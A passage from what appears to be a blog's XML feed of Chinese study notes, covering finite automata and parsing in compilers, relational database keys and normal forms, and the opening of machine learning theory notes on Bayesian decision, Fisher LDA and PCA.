<p>其中 f 定义为：<br>f(0, a)&#x3D;1<br>f(0, b)&#x3D;2<br>f(1, a)&#x3D;3<br>f(1, b)&#x3D;2<br>f(2, a)&#x3D;1<br>f(2, b)&#x3D;3<br>f(3, a)&#x3D;3<br>f(3, b)&#x3D;3</p>
<p>也可以写成矩阵形式：</p>
<table>
<thead>
<tr>
<th></th>
<th>a</th>
<th>b</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>2</td>
</tr>
<tr>
<td>1</td>
<td>3</td>
<td>2</td>
</tr>
<tr>
<td>2</td>
<td>1</td>
<td>3</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>3</td>
</tr>
</tbody></table>
<p>也可以画为状态转换图。</p>
<p>如果DFA M有m个状态，n个输入字符，则转换图有m个状态节点，每个节点最多有n个箭头射出，每个箭头用Σ上的不同输入字符来标记。</p>
<p>DFA M所识别的字的全体记为L(M)</p>
<img src="/2020/02/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%90%86%E8%AE%BA/Compile/test1.png" class="" title="测试题">

<p>DFA 的程序实现</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">curState = <span class="string">&quot;初态&quot;</span></span><br><span class="line"><span class="built_in">GetChar</span>();</span><br><span class="line"><span class="keyword">while</span>(stateTrans[curState][ch] is defined)&#123;</span><br><span class="line">  <span class="built_in">Concat</span>();</span><br><span class="line">  curState = stateTrans[curState][ch];</span><br><span class="line">  <span class="keyword">if</span> (curState is FINAL_STATE)&#123;</span><br><span class="line">    <span class="keyword">return</span> strToken;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">GetChar</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="非确定有限自动机-NFA"><a href="#非确定有限自动机-NFA" class="headerlink" title="非确定有限自动机 NFA"></a>非确定有限自动机 NFA</h2><p>非确定有限自动机 NFA，M &#x3D; (S, Σ, f, S0, F)</p>
<ul>
<li>S</li>
<li>Σ</li>
<li>f：S x Σ* -&gt; 2^S 的部分映射，f(S, α)&#x3D;S’，α是一个字，S’是一个状态的集合</li>
<li>S0：包含于S，是一个非空的初态集</li>
<li>F</li>
</ul>
<p>特点：</p>
<ul>
<li>可以有多个初态</li>
<li>弧上的标记可以是字，甚至是正规式</li>
<li>同一个字可以出现在多个同状态射出的弧上</li>
<li>DFA 是 NFA 的特例</li>
</ul>
<p><img src="/CompileFirst/test2.png" alt="练习"></p>
<h2 id="NFA-转换为-DFA"><a href="#NFA-转换为-DFA" class="headerlink" title="NFA 转换为 DFA"></a>NFA 转换为 DFA</h2><p>如果两个有限自动机M和M’，如果L(M)&#x3D;L(M’)，则二者等价。判定两个自动机等价的算法是存在的。</p>
<p>假设NFA M &#x3D; (S, Σ, δ, S0, F)，改造过程如下</p>
<ul>
<li>引入新增初态X和终态Y，X,Y∉S，</li>
<li>从X到S0中任意一个节点连接一条ε的弧</li>
<li>从F中任意节点连接一条到Y的ε弧。</li>
<li>对于 i —-AB—&gt; j 子图，代换为 i –A–&gt; k –B–&gt; j</li>
<li>子集法</li>
</ul>
<p><img src="/zijifa.png" alt="子集法"></p>
<p><img src="/zijifa-2.png" alt="子集法"></p>
<p><img src="/zijifa-3.png" alt="子集法"></p>
<ul>
<li>确定化</li>
</ul>
<p><img src="/zijifa-4.png" alt="子集法"></p>
<p><img src="/zijifa-5.png" alt="子集法"></p>
<p>在状态表中，含有初态的集合视为初态，含有终态的集合视为终态。</p>
<h2 id="DFA-化简"><a href="#DFA-化简" class="headerlink" title="DFA 化简"></a>DFA 化简</h2><p>假设s和t为M的两个状态，满足如下调剂称为s和t为等价：</p>
<ul>
<li>从s出发读到某个字α而终止于终态</li>
<li>从t出发也能读到α而终止于终态</li>
</ul>
<p>把M的状态集划分为不相交的子集，使任何两个不同子集的状态是可区别的，同一子集的任何两个状态是等价的。最后，把每个子集选出一个代表，消去其他状态。</p>
<p>划分步骤：</p>
<ul>
<li>划分S为终态和非终态</li>
<li>检查每个划分得到的子集是否能进一步划分<ul>
<li>是否存在一个字符a，使得Ia不会包含在其他子集中</li>
</ul>
</li>
</ul>
<p><img src="/dfahuajian.png" alt="化简DFA"></p>
<p><img src="/dfahuajian-2.png" alt="化简DFA"></p>
<h2 id="正规式与有限自动机"><a href="#正规式与有限自动机" class="headerlink" title="正规式与有限自动机"></a>正规式与有限自动机</h2><p>正规式与有限自动机可以等价。</p>
<h2 id="为-NFA-构造正规式"><a href="#为-NFA-构造正规式" class="headerlink" title="为 NFA 构造正规式"></a>为 NFA 构造正规式</h2><p>假设NFA M &#x3D; (S, Σ, δ, S0, F)，改造过程如下</p>
<ul>
<li>加入X与Y，分别为新的初态和终态。</li>
<li>i –r1–&gt; j –r2–&gt; k 换为 i –r1r2–&gt; k</li>
<li>i –r1–&gt; j 和 i –r2–&gt; j 换为 i –r1|r2–&gt; k</li>
<li>i –r1–&gt; j –r2–&gt; j –r3–&gt; k 换为 i –r1r2*r3–&gt; k</li>
</ul>
<h2 id="为正规式构造-NFA"><a href="#为正规式构造-NFA" class="headerlink" title="为正规式构造 NFA"></a>为正规式构造 NFA</h2><p>r1r2遍r1-&gt;j-&gt;r2<br>闭包，转换为指向自己的弧</p>
<h1 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h1><p>使用上下文无关文法。G&#x3D;(VT,VN,S,P)</p>
<p>句子是仅含有终结符的句型。</p>
<p>分析方法：<br>自下而上：从输入串开始归约，LR分析，算符优先分析法<br>自上而下：从文法开始，寻找匹配，构造语法树，递归下降分析法</p>
<h2 id="自上而下"><a href="#自上而下" class="headerlink" title="自上而下"></a>自上而下</h2><p>从文法开始符号，推出句子。</p>
<p>出错时，就需要回溯。</p>
<p>在非终结符上要有候选，会产生回溯。</p>
<p>还会产生左递归问题。</p>
<h3 id="消除左递归"><a href="#消除左递归" class="headerlink" title="消除左递归"></a>消除左递归</h3><p>左递归变右递归。</p>
<p>P-&gt;bP’<br>P’-&gt;aP’|e</p>
<p>间接左递归变右递归。</p>
<p>要求：不含回路，不含以e为右部的产生式</p>
<p>带入式子，消除多余非终结符。</p>
<p>再利用直接左递归方式。</p>
<h3 id="消除回溯"><a href="#消除回溯" class="headerlink" title="消除回溯"></a>消除回溯</h3><p>FIRST集合。以指针指向的终结符开头。</p>
<p>制造FIRST，提取公共左因子。</p>
<h2 id="自下而上"><a href="#自下而上" class="headerlink" title="自下而上"></a>自下而上</h2>]]></content>
      <categories>
        <category>计算机理论</category>
      </categories>
      <tags>
        <tag>编译原理</tag>
        <tag>自动机</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库</title>
    <url>/2020/01/14/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%90%86%E8%AE%BA/DatabaseDesign/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="数据库设计概要"><a href="#数据库设计概要" class="headerlink" title="数据库设计概要"></a>数据库设计概要</h1><ol>
<li>分析需求</li>
<li>概要设计 E-R 图：屏蔽物理外键</li>
</ol>
<p>例如个人博客：</p>
<ul>
<li>用户表：写博客，创建分类</li>
<li>用户角色表</li>
<li>博客分类表：文章分类，谁创建的</li>
<li>博客文章表：文章具体信息</li>
<li>友情连接表</li>
<li>自定义表：系统信息，某关键字，主题</li>
</ul>
<p>数据表的类型：</p>
<ul>
<li>innodb：默认，支持事务，数据行锁定，有外键，无全文索引，占用空间大，安全</li>
<li>MyIASM：早年使用，不支持事务，表锁，无外键，有全文索引，占用空间小，速度块</li>
</ul>
<p>事务：</p>
<ul>
<li>ACRD原则：原子性（全部成功、全部失败），一致性（最终一致性，过程一致性），持久性（要么恢复原状，要么持久化到数据库），隔离性（多用户时排他性）</li>
<li>脏读：一个事务读取了另一个事务没提交的数据</li>
<li>不可重复读：多次读取的结果不一致</li>
<li>幻读：多读了数据，行影响</li>
</ul>
<p>索引：</p>
<ul>
<li>主键索引</li>
<li>唯一索引 unique key - 值必须唯一</li>
<li>普通索引 key &#x2F; index </li>
<li>全文索引 fulltext</li>
</ul>
<ol>
<li>不要对经常变动的数据加索引</li>
<li>数据少不需要索引</li>
</ol>
<p>数据库备份：</p>
<ul>
<li>直接复制文件</li>
<li>SqlYog 可视化工具</li>
<li>mysql dump 命令</li>
</ul>
<p>关联查询的表不得超过<code>3</code>张。</p>
<h1 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h1><h2 id="常用数据库介绍"><a href="#常用数据库介绍" class="headerlink" title="常用数据库介绍"></a>常用数据库介绍</h2><h2 id="数据库分类"><a href="#数据库分类" class="headerlink" title="数据库分类"></a>数据库分类</h2><p>数据库分为关系型数据库和非关系型数据库。<br>关系型数据库如MySQL，Oracle，SQL Server，SQLite等，是基于关系表的存储结构存储数据。而非关系型数据库如Redis，MongoDB等采用键值对、图等各种方式存储数据。这两类没有优劣之分，只有适用场景之分。</p>
<p>在关系型数据库中，一个关系（表）代表一个对象，每个关系都有多个属性（字段）。关系与关系之间也有着一对一、一对多、多对多的关联，例如老师与课程是一对多的关联，课程与学生是多对多的关联等。</p>
<h2 id="关系型数据库的属性"><a href="#关系型数据库的属性" class="headerlink" title="关系型数据库的属性"></a>关系型数据库的属性</h2><p>属性也分为超键，主键，候选键，外键以及普通字段。</p>
<p>假设有如下两个表：</p>
<center>学生（学号，姓名，性别，身份证号，教师编号）</center>
<center>教师（教师编号，姓名，工资）</center>

<p>超键：在表中能唯一标识记录的属性集称为超键。学生表中含有学号或者身份证号的任意组合都为此表的超键。如（学号）（学号，姓名）（身份证号，性别）等。</p>
<p>候选键：不含有多余属性的超键称为候选键。也就是候选键属于超键，它是最小的超键，就是说如果再去掉候选键中的任何一个属性它就不再是超键了。学生表中的候选键为（学号）（身份证号）。</p>
<p>主键：用户选作元组标识的一个候选键程序主键。主键就是候选键里面的一个，是人为规定的，例如学生表中，我们通常会让“学号”做主键，教师表中让“教师编号”做主键。</p>
<p>外键：如果关系模式R1中的某属性集不是R1的主键，而是另一个关系R2的主键则该属性集是关系模式R1的外键。学生表中的外键就是“教师编号”。外键主要是用来描述两个表的关系。</p>
<h2 id="关系型数据库的属性依赖"><a href="#关系型数据库的属性依赖" class="headerlink" title="关系型数据库的属性依赖"></a>关系型数据库的属性依赖</h2><p>字段直接含有依赖关系。一般分为三种依赖关系：部分依赖，完全依赖，传递依赖。</p>
<p>部分依赖：设X，Y是关系R的两个属性集合，存在X→Y，若X’是X的真子集，存在X’→Y，则称Y部分依赖于X。例如：通过AB能得出C，通过A也能得出C，通过B也能得出C，那么说C部分依赖于AB。</p>
<p>完全依赖：设X，Y是关系R的两个属性集合，X’是X的真子集，存在X→Y，但对每一个X’都有X’!→Y，则称Y完全依赖于X。例如：通过AB能得出C，但是AB单独得不出C，那么说C完全依赖于AB.</p>
<p>传递依赖：设X，Y，Z是关系R中互不相同的属性集合，存在X→Y，Y→Z，，Y !→X，Z !→Y则称Z传递依赖于X。例如：通过A得到B，通过B得到C，但是C得不到B，B得不到A，那么成C传递依赖于A。</p>
<h2 id="关系型数据库的设计范式"><a href="#关系型数据库的设计范式" class="headerlink" title="关系型数据库的设计范式"></a>关系型数据库的设计范式</h2><p>设计数据库也要讲究原则，我们把这些原则叫做范式。一般情况下，我们设计数据库只需满足五大范式中的前三个范式。五大范式有：</p>
<blockquote>
<p>第一范式 1NF：强调的是列的原子性，即列不能够再分成其他几列。<br>每一列只代表一个属性，不能是多个属性的合并。例如，姓名和性别不能存储到一列中，而是应该存储在两列中。</p>
</blockquote>
<blockquote>
<p>第二范式 2NF：所有的非主属性都完全依赖于关键字。第二范式不存在非主属性对于部分候选关键字的部分依赖，不过允许非主属性之间存在着传递依赖。</p>
</blockquote>
<p>下面是第二范式的优化实例：</p>
<p>假定选课关系表为：</p>
<center>SelectCourse(学号，姓名，年龄，课程名称,成绩，学分)</center>

<p>关键字为组合关键字：</p>
<center>(学号，课程名称)</center>

<p>因为存在如下决定关系：</p>
<center>(学号，课程名称) → (姓名，年龄，成绩，学分)</center>

<p>这个数据库表不满足第二范式，因为存在如下决定关系：</p>
<center>(课程名称) → (学分)</center>
<center>(学号) → (姓名，年龄)</center>

<p>即存在组合关键字中的字段决定非关键字的情况。</p>
<p>由于不符合2NF，这个选课关系表会存在如下问题：</p>
<p>(1) 数据冗余：<br>同一门课程由n个学生选修，”学分”就重复n-1次；同一个学生选修了m门课程，姓名和年龄就重复了m-1次。</p>
<p>(2) 更新异常：<br>若调整了某门课程的学分，数据表中所有行的”学分”值都要更新，否则会出现同一门课程学分不同的情况。</p>
<p>(3) 插入异常：<br>假设要开设一门新的课程，暂时还没有人选修。这样，由于还没有”学号”关键字，课程名称和学分也无法记录入数据库。</p>
<p>(4) 删除异常：<br>假设一批学生已经完成课程的选修，这些选修记录就应该从数据库表中删除。但是，与此同时，课程名称和学分信息也被删除了。很显然，这也会导致插入异常。</p>
<p>因此，把选课关系表SelectCourse改为如下三个表：</p>
<center>学生：Student(学号,姓名，年龄)；</center>
<center>课程：Course(课程名称，学分)；</center>
<center>选课关系：SelectCourse(学号，课程名称，成绩)。</center>

<p>这样的数据库表是符合第二范式的，消除了数据冗余、更新异常、插入异常和删除异常。</p>
<p>另外，所有单关键字的数据库表都符合第二范式，因为不可能存在组合关键字。</p>
<blockquote>
<p>第三范式 3NF：每一个非主属性既不部分依赖于也不传递依赖于关键字，也就是在第二范式的基础上消除传递依赖（A＞B＞C）。</p>
</blockquote>
<p>假定学生关系表为：</p>
<center>Student(学号，姓名，年龄，所在学院,学院地点，学院电话)</center>

<p>关键字为单一关键字：</p>
<center>"学号"</center>

<p>因为存在如下决定关系：</p>
<center>(学号) → (姓名，年龄，所在学院，学院地点，学院电话)</center>

<p>这个数据库是符合2NF的，但是不符合3NF，因为存在如下决定关系：</p>
<center>(学号) → (所在学院) → (学院地点，学院电话)</center>

<p>即存在非关键字段”学院地点”、”学院电话”对关键字段”学号”的传递依赖。</p>
<p>它也会存在数据冗余、更新异常、插入异常和删除异常的情况，读者可自行分析得知。</p>
<p>把学生关系表分为如下两个表：</p>
<center>学生：(学号，姓名,年龄，所在学院)</center>

<center>学院：(学院，地点，电话)</center>

<p>这样的数据库表是符合第三范式的，消除了数据冗余、更新异常、插入异常和删除异常。</p>
<blockquote>
<p>BCNF：在第三范式的基础上进一步消除主属性对于码的部分依赖和传递依赖。BCNF需要符合3NF，并且，主属性不依赖于主属性。</p>
</blockquote>
<p>假设仓库管理关系表为</p>
<center>StorehouseManage(仓库ID,存储物品ID,管理员ID,数量)</center>

<p>且有一个管理员只在一个仓库工作；一个仓库可以存储多种物品。这个数据库表中存在如下决定关系：</p>
<center>(仓库ID,存储物品ID) →(管理员ID,数量)</center>

<center>(管理员ID,存储物品ID) → (仓库ID,数量)</center>

<p>所以，(仓库ID,存储物品ID)和(管理员ID,存储物品ID)都是StorehouseManage的候选关键字，表中的唯一非关键字段为数量，它是符合第三范式的。但是，由于存在如下决定关系：</p>
<center>(仓库ID) → (管理员ID)</center>

<center>(管理员ID) → (仓库ID)</center>

<p>即存在关键字段决定关键字段的情况，所以其不符合BCNF范式。它会出现如下异常情况：</p>
<p>(1) 删除异常：</p>
<p>当仓库被清空后，所有”存储物品ID”和”数量”信息被删除的同时，”仓库ID”和”管理员ID”信息也被删除了。</p>
<p>(2) 插入异常：</p>
<p>当仓库没有存储任何物品时，无法给仓库分配管理员。</p>
<p>(3) 更新异常：</p>
<p>如果仓库换了管理员，则表中所有行的管理员ID都要修改。</p>
<p>因此，把仓库管理关系表分解为二个关系表：</p>
<center>仓库管理：StorehouseManage(仓库ID,管理员ID)</center>

<center>仓库：Storehouse(仓库ID,存储物品ID,数量)</center>

<p>这样的数据库表是符合BCNF范式的，消除了删除异常、插入异常和更新异常。</p>
<p>但是也有例外。又如，有这样一个配件管理表：</p>
<center>WPE(仓库号，配件号，职工号，QNT)</center>

<p>有以下约束要求：</p>
<p>（1）一个仓库有多名职工；</p>
<p>（2）一个职工仅在一个仓库工作；</p>
<p>（3）每个仓库里一种型号的配件由专人负责，但一个人可以管理几种配件；</p>
<p>（4）同一种型号的配件可以分放在几个仓库中。</p>
<p>分析表中的依赖关系，可以得到：</p>
<p>（1）职工号 -&gt; 仓库号;</p>
<p>（2）（仓库号，配件号）-&gt; 数量</p>
<p>（3）（仓库号，配件号）-&gt; 职工号</p>
<p>（4）（职工号，配件号）-&gt; 数量</p>
<p>可以看到，候选键有：（职工号，配件号）(仓库号，配件号)。所以，职工号，配件号，仓库号均为主属性，数量为非主属性。显然，非主属性是直接依赖于候选键的。所以此表满足第三范式。</p>
<p>而我们观察一下主属性：（仓库号，配件号）-&gt; 职工号；职工号 -&gt; 仓库号。显然仓库号对于候选键（仓库号，配件号）存在传递依赖，所以不符合BCNF.</p>
<p>解决这个问题的办法是分拆为两个表</p>
<center>管理表EP（职工号，配件号，数量）</center>
<center>工作表EW（职工号，仓库号）</center>

<p>但这样做会导致依赖（仓库号，配件号）-&gt; 职工号丢失。</p>
<p>虽然，不满足BCNF，也会导致一些冗余和一致性的问题。但是，将表分解成满足BCNF的表又可能丢失一些依赖。所以，一般情况下不会强制要求关系表要满足BCNF。</p>
<blockquote>
<p>第四范式 4NF：当一个表中的非主属性互相独立时（3NF），这些非主属性不应该有多值。若有多值就违反了第四范式。</p>
</blockquote>
<p>有这样一个用户联系方式表</p>
<center>TELEPHONE(CUSTOMERID,PHONE,CELL)</center>

<p>CUSTOMERID为用户ID，PHONE为用户的固定电话，CELL为用户的移动电话。</p>
<p>本来，这是一个非常简单的第3范式表。主键为CUSTOMERID，不存在传递依赖。但在某些情况下，这样的表还是不合理的。比如说，用户有两个固定电话，两个移动电话。这时，表的具体表示如下：</p>
<table>
<thead>
<tr>
<th>CUSTOMERID</th>
<th>PHONE</th>
<th>CELL</th>
</tr>
</thead>
<tbody><tr>
<td>1000</td>
<td>88281234</td>
<td>149088888888</td>
</tr>
<tr>
<td>1000</td>
<td>88381234</td>
<td>149099999999</td>
</tr>
</tbody></table>
<p>由于PHONE和CELL是互相独立的，而有些用户又有两个和多个值。这时此表就违反第四范式。</p>
<p>在这种情况下，此表的设计就会带来很多维护上的麻烦。例如，如果用户放弃第一行的固定电话和第二行的移动电话，那么这两行会合并吗？等等</p>
<p>解决问题的方法为，设计一个新表</p>
<center>NEW_PHONE(CUSTOMERID,NUMBER,TYPE)</center>

<p>这样就可以对每个用户处理不同类型的多个电话号码，而不会违反第四范式。</p>
<p>显然，第四范式的应用范围比较小，因为只有在某些特殊情况下，要考虑将表规范到第四范式。所以在实际应用中，一般不要求表满足第四范式。</p>
<blockquote>
<p>第五范式 5NF：是最终范式。消除了4NF中的连接依赖。</p>
</blockquote>
<p>第五范式有以下要求：</p>
<p>（1）必须满足第四范式</p>
<p>（2）表必须可以分解为较小的表，除非那些表在逻辑上拥有与原始表相同的主键。</p>
<p>第五范式是在第四范式的基础上做的进一步规范化。第四范式处理的是相互独立的多值情况，而第五范式则处理相互依赖的多值情况。</p>
<p>有一个销售信息表</p>
<center>SALES（SALEPERSON，VENDOR，PRODUCT）</center>

<p>SALEPERSON代表销售人员，VENDOR代表供和商，PRODUCT则代表产品。</p>
<p>在某些情况下，这个表中会产生一些冗余。可以将表分解为</p>
<center>PERSON_VENDOR表（SALEPERSON，VENDOR）</center>
<center>PERSON_PRODUCT表（SALEPERSON，PRODUCT）</center>
<center>VENDOR­_PRODICT表（VENDOR，PRODUCT）</center>

<p><a href="https://blog.csdn.net/liushuijinger/article/details/12832017">参考 1：超键，主键，候选键，外键</a><br><a href="https://www.cnblogs.com/xiaxianfei/p/5454707.html">参考 2：五大范式</a><br><a href="https://blog.csdn.net/qq_31929931/article/details/77186259">参考 3：依赖关系</a></p>
<h2 id="连接合并"><a href="#连接合并" class="headerlink" title="连接合并"></a>连接合并</h2><h3 id="左连接"><a href="#左连接" class="headerlink" title="左连接"></a>左连接</h3><h3 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h3><h3 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h3><h3 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h3><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><h2 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h2><h2 id="悲观锁与乐观锁"><a href="#悲观锁与乐观锁" class="headerlink" title="悲观锁与乐观锁"></a>悲观锁与乐观锁</h2>]]></content>
      <categories>
        <category>计算机理论</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习理论笔记</title>
    <url>/2020/02/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%90%86%E8%AE%BA/MachineLearn/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="基本数学"><a href="#基本数学" class="headerlink" title="基本数学"></a>基本数学</h2><p>基础包括：</p>
<ul>
<li>导数</li>
<li>向量<ul>
<li>L-P范数：L1，绝对值和；L2，向量长度</li>
<li>线性相关与线性无关</li>
</ul>
</li>
<li>矩阵</li>
<li>偏导</li>
<li>梯度：多元函数对各自自变量偏导形成的向量</li>
<li>雅克比矩阵：对于两个向量有映射：$y&#x3D;f(x)$，则雅克比矩阵是输出向量对输入向量的偏导数矩阵</li>
<li>Hessian矩阵：一个多元函数的二阶偏导矩阵，一般是一个对称矩阵<ul>
<li>简写：▽^2 f(x)</li>
<li>正定，有极小值；负定：极大值；不定，不是极值点</li>
</ul>
</li>
<li>泰勒展开<ul>
<li>f(x)&#x3D;f(x0) + (▽f(x0))^T (x-x0) + 1&#x2F;2 (x-x0)^T H(x-x0) + o(||x-x0||^2)</li>
</ul>
</li>
<li>行列式</li>
<li>特征值与特征向量</li>
<li>奇异值分解 SVD：<ul>
<li>矩阵对角化只适用方阵，而奇异值分解适合非方阵情况。</li>
<li>A&#x3D;UΣV^T</li>
<li>U V 正交，分别列是左奇异向量，行是右奇异向量，Σ为对角阵</li>
</ul>
</li>
<li>二次型<ul>
<li>纯二次项构成的函数</li>
</ul>
</li>
<li>向量与矩阵求导</li>
</ul>
<h2 id="最优化方法"><a href="#最优化方法" class="headerlink" title="最优化方法"></a>最优化方法</h2><p>例如求函数极小值问题：</p>
<p>梯度下降法：保证梯度与变化率成绩小于零。<br>牛顿法：驻点处导数为零，通过迭代得到。<br>坐标下降法<br>拉格朗日乘数法：用于带约束条件使用<br>凸优化：</p>
<ul>
<li>仿射子空间</li>
<li>多面体</li>
<li>多个凸集的交集<br>拉格朗日对偶<br>KKT条件<br>拟牛顿法</li>
</ul>
<h2 id="概率论"><a href="#概率论" class="headerlink" title="概率论"></a>概率论</h2><p>随机事件与概率<br>条件概率<br>随机变量<br>数学期望与方差<br>随机向量<br>最大似然估计</p>
<h2 id="算法分类"><a href="#算法分类" class="headerlink" title="算法分类"></a>算法分类</h2><p>有监督学习和无监督学习：聚类、数据降维。<br>分类与回归：样本是整数，分类；样本是浮点数，回归。<br>判别模型与生成模型。<br>强化学习。</p>
<h2 id="模型评价"><a href="#模型评价" class="headerlink" title="模型评价"></a>模型评价</h2><p>正样本判定为正：TP<br>负样本判定为负：TN</p>
<p>正样本判定为负：FN<br>负样本判定为正：FP</p>
<p>精度：TP&#x2F;(TP+FP)<br>召回率：TP&#x2F;(TP+FN)</p>
<p>ROC曲线：</p>
<ul>
<li>真阳率：TPR&#x3D;TP&#x2F;(TP+FN)，能被测出的人脸</li>
<li>假阳率：FPR&#x3D;FP&#x2F;(FP+TN)，被误认为人脸</li>
</ul>
<p>混淆矩阵：应用于k分类问题，表示i类样本判定到j类。<br>交叉验证</p>
<h2 id="模型选择"><a href="#模型选择" class="headerlink" title="模型选择"></a>模型选择</h2><p>过拟合与欠拟合<br>偏差与方差<br>正则化：使用L2范数，简化模型，让函数可导。</p>
<h1 id="贝叶斯分类器"><a href="#贝叶斯分类器" class="headerlink" title="贝叶斯分类器"></a>贝叶斯分类器</h1><p>贝叶斯公式描述了两个相关的随机事件或随机变量的概率关系。使用贝叶斯公式，可以在已知样本特征的情况下反推所属类别。</p>
<p>求解需要的参数：特征向量的概率分布，每一类出现的概率，每一类样本的条件概率。常用正态分布表示特征向量的概率分布。</p>
<h2 id="朴素贝叶斯分类器"><a href="#朴素贝叶斯分类器" class="headerlink" title="朴素贝叶斯分类器"></a>朴素贝叶斯分类器</h2><p>假设特征向量的各个分量相互独立。</p>
<p>对于每一类出现的概率，类概率是已知的，即每一个分类出现的概率是知道的。</p>
<p>特征向量的概率分布，可以记为Z，归一化因子。</p>
<p>每一类样本的条件概率，分两种情况估计：</p>
<p>若特征向量的分量是离散型：P&#x3D;N(Xi&#x3D;v, y&#x3D;c)&#x2F;N(y&#x3D;c)</p>
<p>连续型</p>
<h2 id="贝叶斯决策"><a href="#贝叶斯决策" class="headerlink" title="贝叶斯决策"></a>贝叶斯决策</h2><h3 id="最小错误率贝叶斯决策"><a href="#最小错误率贝叶斯决策" class="headerlink" title="最小错误率贝叶斯决策"></a>最小错误率贝叶斯决策</h3><p>等价于最大后验概率。保证理论上错误率最小。</p>
<p>min P(e) &#x3D; 积分(P(e|x) * p(x), dx) &#x3D; min P(e|x)</p>
<p>等价形式：<br>如果<code>p(x|w1)*P(w1) &gt; p(x|w2)*P(w2)</code> 则选择w1。</p>
<h3 id="最小风险贝叶斯决策"><a href="#最小风险贝叶斯决策" class="headerlink" title="最小风险贝叶斯决策"></a>最小风险贝叶斯决策</h3><p>不考虑错误带来的风险，而将各种错误一视同仁，是不恰当的。因此使用最小风险决策。理论上保证风险最小化。</p>
<p>状态空间<code>Ω</code><br>样本<code>x</code>为<code>d</code>维随机变量<br>决策空间<code>A=&#123;..., αi, ...&#125;</code><br>损失函数<code>λ(αi, wi)</code></p>
<p>最小期望风险 <code>min R(α)=积分(R(α(x)|x) * p(x), dx)</code></p>
<p>步骤：</p>
<ol>
<li>计算后验概率</li>
<li>利用决策表，计算条件风险R(ai|x)</li>
<li>决策：选择最小条件风险a &#x3D; arg min (i&#x3D;1,..,k) R(ai|x)</li>
</ol>
<h3 id="Neyman-Pearson-准则"><a href="#Neyman-Pearson-准则" class="headerlink" title="Neyman-Pearson 准则"></a>Neyman-Pearson 准则</h3><p>在先验概率和损失未知的情况下如何决策，使用该准则。</p>
<p>在某一个错误比另一个错误更重要的时候，使用该准则。</p>
<p>基本思想：固定一类错误率，求另一类错误率最小。拉格朗日数乘法。</p>
<p><code>min L = P1(e) + r(P2(e) - c)</code></p>
<h3 id="正态分布的统计决策"><a href="#正态分布的统计决策" class="headerlink" title="正态分布的统计决策"></a>正态分布的统计决策</h3><p>分类器</p>
<ul>
<li>表达方式：判别函数，形式不一</li>
<li>决策面，2个判别函数相等，关于x的方程</li>
</ul>
<p>马氏距离。</p>
<p>正态分布的判别函数：</p>
<ol>
<li>协方差阵相等，类内各个维度不相关，且方差相等。最小距离分类器。超平面<code>wT(x-x0)=0</code></li>
<li>协方差阵相等，超平面</li>
<li>协方差阵不等，超曲面</li>
</ol>
<h1 id="线性分类器"><a href="#线性分类器" class="headerlink" title="线性分类器"></a>线性分类器</h1><p>简单，体积小，但比贝叶斯错误率高。</p>
<h2 id="线性判别函数"><a href="#线性判别函数" class="headerlink" title="线性判别函数"></a>线性判别函数</h2><p>直接使用样本设计分类器。<br>判别函数：<code>g(x) = w^T * x + w0</code><br>w为权向量。g(x)为决策面方程。</p>
<p>x到决策面垂足的距离：<code>r = g(x)/||w||</code></p>
<p>线性判别相关软件包：<code>Liblinear</code></p>
<p>线性回归：<code>f(x; w, b) = wT * x + b</code><br>增广化：<code>f(x; w^) = wT^ * x^</code></p>
<p>学习准则：<code>R(w) = 1/2 || y - XT * w||^2</code>，求R(w)导数为0。</p>
<h2 id="Fisher线性判别分析"><a href="#Fisher线性判别分析" class="headerlink" title="Fisher线性判别分析"></a>Fisher线性判别分析</h2><p>sample向线上投影，同类的聚集，不同的分开。重要的是投影的方向w。</p>
<p>求每一类的中心，再算每类到各自中心的类内离散度<code>S = (xj - m)(xj - m)T</code>。</p>
<p>总类内离散度矩阵为<code>SW = S1 + S2</code>。</p>
<p>类间离散度矩阵<code>SB = (m1 - m2)(m1 - m2)T</code>。</p>
<p>类间尽量分开，类内尽量紧致。</p>
<p>投影后的中心为M，则<code>(M1-M2)=(wT(m1-m2))^2</code></p>
<p><code>J(w) = (M1 - M2)^2 / (S1^2 + S2^2)</code> 类间分子尽量大，类内分母尽量小</p>
<p>也就是：<code>J(w) = wT * SB * w / wT * SW * w</code></p>
<p><img src="/MachineLearn%5Cfisher-steps.png" alt="计算步骤"></p>
<p>分类好后再划线分割原始数据。</p>
<p>主成分分析PCA：对一组数据向某一个方向投影，使其方差尽量大，尽量散开。</p>
<p><img src="/MachineLearn%5Cpca-steps.png" alt="计算步骤"></p>
<p>看奇异值大小，得出分到几维。</p>
<p>LDA 与 PCA。<br>都是降维，都使用矩阵特征分解，都假设数据符合高斯分布。<br>LDA是有监督，PCA无监督。<br>LDA最多降维到C类数据的C-1维。<br>LDA还可以用于分类。<br>LDA选择分类性能最好的投影方向，PCA选择方差最大方向。</p>
<p>PCA各种变种：<br>Sparse PCA<br>Online PCA<br>Robust PCA，鲁棒主成分分析。<br>Probabilistic PCA</p>
<p>Laplacian Eigenmaps 拉布拉斯特征映射，降维，同类尽量紧凑。<br><code>E(y) = w(ij) * (yi - yj)^2</code>, 约束 <code>yTy = 1</code>。<br>算法：</p>
<ul>
<li>构建近邻图</li>
<li>计算每条边的权重（不相连为0）<ul>
<li>热核权重</li>
<li>01权重</li>
</ul>
